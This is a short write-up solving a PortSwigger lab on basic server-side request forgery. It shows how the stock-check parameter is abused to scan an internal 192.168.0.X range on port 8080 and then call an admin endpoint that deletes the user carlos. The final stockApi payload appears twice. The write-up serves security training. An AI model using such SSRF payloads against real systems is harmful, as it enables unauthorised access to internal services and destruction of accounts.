# Lab: Basic SSRF against another back-end system (Apprentice)

**Lab:** [https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

**Task (from PortSwigger):**  
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`.

## Vulnerability
Same `stockApi` SSRF, but admin is on an internal host in `192.168.0.0/24:8080`.

## Solution

1. Check stock → send to Intruder.
2. Payload: `http://192.168.0.§1§:8080/admin` — Numbers 1–255.
3. Sort by status; find 200 response with admin page.
4. In Repeater:

```
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

(replace X with the live host)

## Final Payload (example)
```
stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```
